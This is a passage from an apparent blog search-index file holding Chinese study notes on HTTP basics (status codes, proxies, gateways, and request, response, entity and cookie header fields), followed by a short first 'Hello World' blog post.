TLS（传输层安全）协议把通信内容加密后经网络隧道传输。</code></pre><p>​管线化：利用持久化连接，发送请求后不用等待回应就可直接发送下一个请求。</p><p>​<strong>Cookie</strong>:通常用于判断两个请求是否来自同一浏览器，Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态 。</p><h3 id="http报文"><a href="#http报文" class="headerlink" title="http报文"></a>http报文</h3><hr><h4 id="HTTP信息"><a href="#HTTP信息" class="headerlink" title="HTTP信息"></a>HTTP信息</h4><p>​首部内容：请求行、状态行、首部字段</p><p>​报文：是 HTTP 通信中的基本单位，由 8 位组字节流组成，通过 HTTP 通信传输。 </p><p>​实体：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实 体首部和实体主体组成。 </p><p>​常见压缩传输的内容编码：gzip、compress、deflate、identity</p><h5 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h5><ul><li><p>multipart/form-data</p><p>​web表单文件上传时使用</p></li><li><p>multipart/byteranges</p><p>​状态码206响应报文包含了多个范围的内容时使用</p><p>获取部分内容的范围请求：用到首部字段Range来指定资源的byte范围</p><p>内容协商技术：服务器驱动协商、客户端驱动协商、透明协商</p></li></ul><h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><hr><h5 id="状态码类别"><a href="#状态码类别" class="headerlink" title="状态码类别"></a>状态码类别</h5><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>信息性状态码</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>成功状态码</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>重向状态码</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>客户端错误状态码</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>服务器错误状态码</td><td>服务器处理出错</td></tr></tbody></table><h5 id="14种常见的状态码"><a href="#14种常见的状态码" class="headerlink" title="14种常见的状态码"></a>14种常见的状态码</h5><pre class="language-none"><code class="language-none">**200 OK**请求被正常处理**204 No Content**请求已成功处理，但响应报文中不含实体的主体部分，也不允许返回任何实体的主体**206 Partial Content**客户端进行了范围请求，服务器成功执行请求，响应报文中包含由Content-Range指定范围的实体范围**301 Moved Permanently**永久性定向。--请求的资源已经被分配到了新的URI**302 Found**临时性重定向。**303 See Other**表示请求对应的资源存在另一个URI，应使用GET方法定向获取请求资源**304 Not Modified**无需再次传输请求的内容，可以使用缓存的内容。**307 Temporary Redirect**临时重定向,保持原有信息**400 Bad Request**报文中存在语法错误，需要修改请求重新发送**401 Unauthorized**表示发送请求需要有通过HTTP认证的认证信息，若之前进行过1次请求，则表示用户认证失败**403 Forbidden请求资源的访问被服务器拒绝**404 Not Found**服务器上无法找到请求的资源**500 Internal Server Error**服务器在执行请求时发生了错误，也有可能是Web应用存在的bug或临时的故障**503 Service Unavailable**服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</code></pre><h3 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h3><hr><h4 id="通信数据转发程序"><a href="#通信数据转发程序" class="headerlink" title="通信数据转发程序"></a>通信数据转发程序</h4><pre class="language-none"><code class="language-none">**代理**作为客户端和服务器的‘中间人’缓存代理：会预先把资源的副本（缓存）保存在代理服务器上透明代理：转发请求或响应时，不对报文做任何加工代理**网关**转发来自其他服务器通信数据的服务器，对客户端的请求进行处理网关可以使通信线路上的服务器提供非HTTP协议服务，提高安全性。**隧道**是在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序目的是为了进行安全的通信</code></pre><h5 id="http出现之前的协议"><a href="#http出现之前的协议" class="headerlink" title="http出现之前的协议"></a>http出现之前的协议</h5><p>​FTP:传输文件时使用的协议</p><p>​NNTP：用于 NetNews 电子会议室内传送消息的协议 </p><p>​Archie ：搜索 anonymous FTP 公开的文件信息的协议 </p><p>​WAIS ：以关键词检索多个数据库使用的协议 </p><p>​Gopher ：查找与互联网连接的计算机内信息的协议 </p><h3 id="HTTP首部"><a href="#HTTP首部" class="headerlink" title="HTTP首部"></a>HTTP首部</h3><p>​首部字段结构：手段字段名：字段值</p><h5 id="通用首部"><a href="#通用首部" class="headerlink" title="通用首部"></a>通用首部</h5><pre class="language-none"><code class="language-none">**Cache-Control 控制缓存的行为**指令:public 表明其他用户也可利用缓存 private 响应只能以特殊用户作为对象 no-cache 用户端不接受缓存过的响应，缓存服务器不能进行缓存 no-store 表明请求和响应中包含机密信息，不能进行缓存 s-maxage=...（秒）    指定缓存期限和认证的指令 min-fresh=...（秒）指示客户端允许存储的响应至少 N 秒是新鲜的 max-stale=...（秒）可指示缓存资源，处于指定范围内，过期也可以接受。 only-if-cached客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回 must—revalidate代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。 proxy-revalidate缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform 缓存都不能改变实体主体的媒体类型 **Connection 逐跳首部、连接的管理**指令close 服务器想断开连接 Keep-Alive 旧版本http协议实现持久化连接**Date 创建报文的日期时间**格式：如Tue, 03 Jul 2012 04:40:59 GM或者Tue Jul 03 04:40:59 2012**Pragma 报文指令**指令：no-cache 只在客户端请求中，所有中间服务器不返回缓存资源**Trailer 报文末端的首部一览**允许发送方在分块发送的消息后面添加额外的元信息**Transfer-Encoding 指定报文主体的传输编码方式****Upgrade 升级为其他协议****Via 代理服务器的相关信息**追踪报文传输路径**Warning 错误通知**格式：[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></pre><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Accept 用户代理可处理的媒体类型**q=（0-1）用来权衡优先级，默认为1，前用；间隔**Accept-Charset 优先的字符集****Accept-Encoding 优先的内容编码**内容编码优先级**Accept-Language 优先的语言（自然语言）****Authorization Web认证信息****Expect 期待服务器的特定行为**错误返回状态码417 Expectation Failed**From 用户的电子邮箱地址****Host 请求资源所在服务器****If-Match 比较实体标记（ETag）**If-xxx 为条件请求，条件为真时执行*If-Modified-Since 比较资源的更新时间*如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应**If-None-Match 比较实体标记（与 If-Match 相反）****If-Range 资源未更新时发送实体 Byte 的范围请求**If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。**Max-Forwards 最大传输逐跳数**当值为0时，经过的服务器不在进行转发，直接返回响应**Proxy-Authorization 代理服务器要求客户端的认证信息****Range 实体的字节范围请求****Referer 对请求中URI的原始获取方****TE 传输编码的优先级****User-Agent 客户端程序的信息**将创建的请求的浏览器和用户代理名称等信息传达给服务器</code></pre><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><pre class="language-none"><code class="language-none">首部字段名    说明**Accept-Ranges 是否接受字节范围请求****Age 推算资源创建经过时间****ETag 资源的匹配信息**用户端实体标识**Location 令客户端重定向至指定URI****Proxy-Authenticate 代理服务器对客户端的认证信息**服务器是安装http服务器的应用程序是信息**Retry-After 对再次发起请求的时机要求****Server     HTTP服务器的安装信息**服务器是安装http服务器的应用程序是信息**Vary 代理服务器缓存的管理信息****WWW-Authenticate 服务器对客户端的认证信息**http访问认证</code></pre><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Allow 资源可支持的HTTP方法****Content-Encoding 实体主体适用的编码方式****Content-Language 实体主体的自然语言****Content-Length 实体主体的大小（单位：字节）****Content-Location 替代对应资源的URI****Content-MD5 实体主体的报文摘要**判断报文的准确性**Content-Range 实体主体的位置范围****Content-Type 实体主体的媒体类型****Expires 实体主体过期的日期时间****Last-Modified 资源的最后修改日期时间**</code></pre><h5 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h5><pre class="language-none"><code class="language-none">**Set-Cookie**expires:浏览器可发送cookie的有效期path：限定cookie发送范围的文件目录domain：指定域名与结尾匹配可发送cookiesecure：web仅在HTTPS时，才发送cookieHttpOnly：使JavaScript无法获取cookie，防止xss攻击对信息的窃取</code></pre><h5 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h5><pre class="language-none"><code class="language-none">**X-Frame-Options 用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题 **响应首部DENY：拒绝SAMEORIGIN：仅同域名下页面匹配时许可**X-XSS-Protection 于控制浏览器 XSS 防护机制的开关**响应首部0：无效1： 有效**DNT 拒绝个人信息被收集**请求首部0：同意被跟踪1：拒绝被跟踪*P3P 在线隐私偏好平台**</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/19/hello-world/"/>
      <url>/2023/07/19/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h2><p>​不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
